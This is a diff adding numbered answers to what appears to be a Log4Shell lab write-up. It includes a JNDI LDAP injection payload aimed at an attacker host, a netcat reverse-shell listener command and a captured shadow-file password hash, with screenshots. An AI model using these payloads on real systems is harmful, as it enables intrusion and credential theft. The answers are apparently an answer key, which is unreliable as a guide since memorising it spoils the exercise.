@@ -54,3 +54,28 @@ uname=${jndi:ldap://172.16.238.11:1389/a}
 <img width="1920" height="1080" alt="Screenshot_2025-08-09_12_29_04" src="https://github.com/user-attachments/assets/d04ce7d6-019b-49a9-8b30-867ff4f02b51" />
 6  Server: SimpleHTTP/0.6 Python/3.4.2
 <img width="1920" height="1080" alt="Screenshot_2025-08-09_12_33_14" src="https://github.com/user-attachments/assets/5d173c01-ec7f-411d-bc4f-18845cf94ad3" />
+7 172.16.238.10
+<img width="1920" height="1080" alt="Screenshot_2025-08-16_11_26_30" src="https://github.com/user-attachments/assets/d9071988-749a-4ea4-8bc4-b68c3af6b055" />
+
+
+8 Destination80 Port: 80
+<img width="1920" height="1080" alt="Screenshot_2025-08-16_11_30_50" src="https://github.com/user-attachments/assets/f234b664-fb9d-433e-b050-ddc9b54c9887" />
+9  172.16.238.1
+<img width="1920" height="1080" alt="Screenshot_2025-08-16_11_46_43" src="https://github.com/user-attachments/assets/0e90d00f-9f9d-40f9-a8e6-95f6d7c4ac8a" />
+10 
+Server: SimpleHTTP/0.6 Python/3.4.2\r\n
+<img width="1920" height="1080" alt="Screenshot_2025-08-16_12_32_01" src="https://github.com/user-attachments/assets/0f05f04b-9e81-49dc-b5ca-a61536fc5023" />
+
+
+11 10.10.10.31
+<img width="1920" height="1080" alt="Screenshot_2025-08-16_12_19_19" src="https://github.com/user-attachments/assets/e21a1f40-9a03-4991-8930-8c0b29285849" />
+12 port  9001
+<img width="1920" height="1080" alt="Screenshot_2025-08-16_12_23_27" src="https://github.com/user-attachments/assets/515e968b-312f-4e94-b09e-f9606da37b73" />
+13
+nc -lvnp 9001
+14
+id
+<img width="1920" height="1080" alt="Screenshot_2025-08-16_12_26_09" src="https://github.com/user-attachments/assets/db78093c-dcbf-4816-b393-f8526d2a0466" />
+15 user:$6$FrLlfpte$okbfA753Sj2SSVu4czU2kyvwiUgp5xUlAyjBGCiiuowquISi8SMsn5xXSUqBKQ/2DSSQA3KBpKUAxZCmAEjjS/:16715:0:99999:7:::
+<img width="1920" height="1080" alt="Screenshot_2025-08-16_12_28_02" src="https://github.com/user-attachments/assets/c54affdb-ad68-4aea-a480-ba8c2cc764e0" />
+
